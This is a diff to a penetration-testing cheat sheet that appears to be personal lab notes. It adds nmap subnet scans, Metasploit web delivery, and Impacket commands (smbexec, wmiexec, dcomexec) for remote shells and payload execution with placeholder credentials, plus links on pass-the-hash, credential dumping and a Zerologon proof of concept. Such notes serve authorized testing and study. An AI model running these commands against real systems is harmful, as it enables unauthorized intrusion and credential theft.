@@ -19,6 +19,12 @@ nmap -vv -n -Pn -sT -sV -sC -p- -oN $'nmap.tcp.thorough.'${HOST}$'.'$(date -Isec
 
 # UDP scan.
 nmap -vv -n -Pn -sV -sC -sU -oN $'nmap.udp.'${HOST}$'.'$(date -Iseconds) $HOST
+
+# Subnet scan, including a ping sweep.
+nmap -vv -n -sT 10.10.10.0/24
+
+# Subnet scan without a ping sweep.
+nmap -vv -n -Pn -sT 10.10.10.0/24
 ```
 
 ### HTTP Enumeration
@@ -172,12 +178,6 @@ impacket-smbserver -smb2support MySmbTransferShare ./smb-files
 
 ### FTP File Exfiltration
 
-#### Pushing
-
-TODO
-
-#### Pulling
-
 If you can reach a target that has an FTP server, you probably want those files. In the event you are trying to exfil from a host that does not have a native FTP client, but has Python, the following script provides a solution:
 
 ```python
@@ -268,7 +268,7 @@ This is especially useful when routing through existing meterpreter sessions.
 
 ### Web Delivery
 
-[Web delivery](TODO) Metasploit module can be useful for executing meterpreter agents on target in-memory when you can run commands but don't have a great interactive environment yet:
+The [web delivery Metasploit module](https://www.offensive-security.com/metasploit-unleashed/web-delivery/) can be useful for executing meterpreter agents on target in-memory when you can run commands but don't have a great interactive environment yet:
 
 ```sh
 use exploit/multi/script/web_delivery
@@ -311,9 +311,6 @@ Using native Windows utilities:
 ```bat
 :: Basic check to see if we have administrator access to the remote machine.
 dir \\HOST\C$
-
-:: TODO
-TODO
 ```
 
 [`PsExec.exe`](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec), with admin privileges, lets you open shells on other Windows boxes:
@@ -339,16 +336,25 @@ smbmap -u 'MyUsername' -p 'MyPassword' -H 10.10.10.10 --download 'C$\temp\file.t
 smbmap -u 'MyUsername' -p 'MyPassword' -H 10.10.10.10 --upload './local/payload.exe' 'C$\temp\upload.exe'
 ```
 
-Impacket's [TODO](TODO) provides TODO from a Linux workstation:
+Impacket's [`smbexec.py`](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py) and [`smbclient.py`](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbclient.py) provide similar tooling:
 
 ```sh
-TODO
+# smbexec.py differs slightly from psexec.py in the way that output is captured. Since
+# output is written to and read from an SMB share folder, we also have the option of
+# hosting a server locally and having command output written to / read from our attack
+# machine (requring root to listen on port 445).
+impacket-smbexec MyDomain/MyUsername:MyPassword@10.10.10.10
+sudo impacket-smbexec -mode SERVER MyDomain/MyUsername:MyPassword@10.10.10.10
+
+# smbclient.py gives an semi-interactive shell capable of interacting with the remote
+# file system and querying other information.
+impacket-smbclient MyDomain/MyUsername:MyPassword@10.10.10.10
 ```
 
 [`winexe`](https://tools.kali.org/maintaining-access/winexe) is yet another option from a Linux workstation:
 
 ```sh
-TODO
+winexe -U 'MyUsername%MyPassword' //10.10.10.10 'hostname'
 ```
 
 We can also kick off payloads by creating and starting a service on a remote machine:
@@ -433,15 +439,25 @@ Some examples from `cmd.exe`:
 wmic /node:10.10.10.10 process call create payload.exe
 ```
 
-From a Linux workstation, Impacket's [TODO](TODO) provides some query and execution tooling:
+From a Linux workstation, Impacket's [`wmiquery.py`](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiquery.py) and [`wmiexec.py`](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py) provide some query and execution tooling:
 
 ```sh
-# TODO
-TODO
+# Query users on a system.
+impacket-wmiquery MyDomain/MyUsername:MyPassword@10.10.10.10
+# Enter a query like: Select * from Win32_UserAccount
 
 # Query event filter related entities.
-TODO
+impacket-wmiquery --namespace //./root/subscription MyDomain/MyUsername:MyPassword@10.10.10.10
+# Enter a queries like:
+# Select * from __EventFilter
+# Select * from CommandLineEventConsumer
+# Select * from __FilterToConsumerBinding
+
+# Pop an interactive session on a target.
+impacket-wmiexec MyDomain/MyUsername:MyPassword@10.10.10.10
 ```
+
+See [Hunting for Impacket](https://riccardoancarani.github.io/2020-05-10-hunting-for-impacket/) for a blue team perspective on identifying the use of these tools.
 
 #### DCOM
 
@@ -461,15 +477,45 @@ $com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application"
 $com.Document.ActiveView.ExecuteShellCommand("C:\temp\payload.exe", $null, "-cmd -line -args", "7")
 ```
 
-### Impacket Family of Tools
+This process can also be performed from a Linux workstation via [`dcomexec.py`](https://github.com/SecureAuthCorp/impacket/blob/master/examples/dcomexec.py):
 
-TODO: maybe remove this section, but need to look through list
+```sh
+# Supported objects: MMC20, ShellWindows, ShellBrowserWindow.
+impacket-dcomexec -object MMC20 MyDomain/MyUser:MyPassword@10.10.10.10
+```
 
-### File System Enumeration
+#### Other Useful Impacket Scripts
+
+The following Impacket scripts also provide useful remote query capabilities (some example use can be found [here](https://www.hackingarticles.in/impacket-guide-smb-msrpc/)):
+
+* [`GetADUsers.py`](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetADUsers.py)
+* [`GetUserSPNs.py`](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py)
+* [`atexec.py`](https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py)
+* [`dpapi.py`](https://github.com/SecureAuthCorp/impacket/blob/master/examples/dpapi.py)
+* [`ntlmrelayx.py`](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py)
+* [`registry-read.py`](https://github.com/SecureAuthCorp/impacket/blob/master/examples/registry-read.py)
+* [`smbrelayx.py`](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbrelayx.py)
+* [`services.py`](https://github.com/SecureAuthCorp/impacket/blob/master/examples/services.py)
+
+### Passing the Hash
+
+[This Cobalt Strike blog post](https://blog.cobaltstrike.com/2015/05/21/how-to-pass-the-hash-with-mimikatz/) talks through a use case to pass the hash to gain a different token for a local process, which can then be used to interact with different remote systems under the context of a different user.
 
 TODO
 
 ### Active Directory Enumeration
+
+TODO
+
+### Kerbeos
+
+TODO
+
+#### NTLM Relaying
+
+TODO
+
+### File System Enumeration
 
 TODO
 
@@ -479,13 +525,15 @@ Useful cheatsheet can be found [here](https://github.com/HarmJ0y/CheatSheets/blo
 
 ### Pillaging Credentials
 
-#### Impacket's `secretsdump.py`
+#### Pillaging Offline
 
 [`secretsdump.py`](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) can be used to dump hashes from , both over the network and offline from hive files.
 
 ```sh
 TODO
 ```
+
+Guide on dumping Windows credential files and dumping hashes from them offline with `secretsdump.py` can be found [here](https://airman604.medium.com/dumping-active-directory-password-hashes-deb9468d1633).
 
 #### DPAPI Fun with Mimikatz
 
@@ -532,6 +580,10 @@ Also see [the mimikatz wiki article on decrypting Credential Manager stored cred
 ## Common Windows Vulnerabilities
 
 TODO
+
+### Zerologon
+
+POC is available [here](https://github.com/bb00/zer0dump).
 
 ## Linux Pivoting/Tooling
 
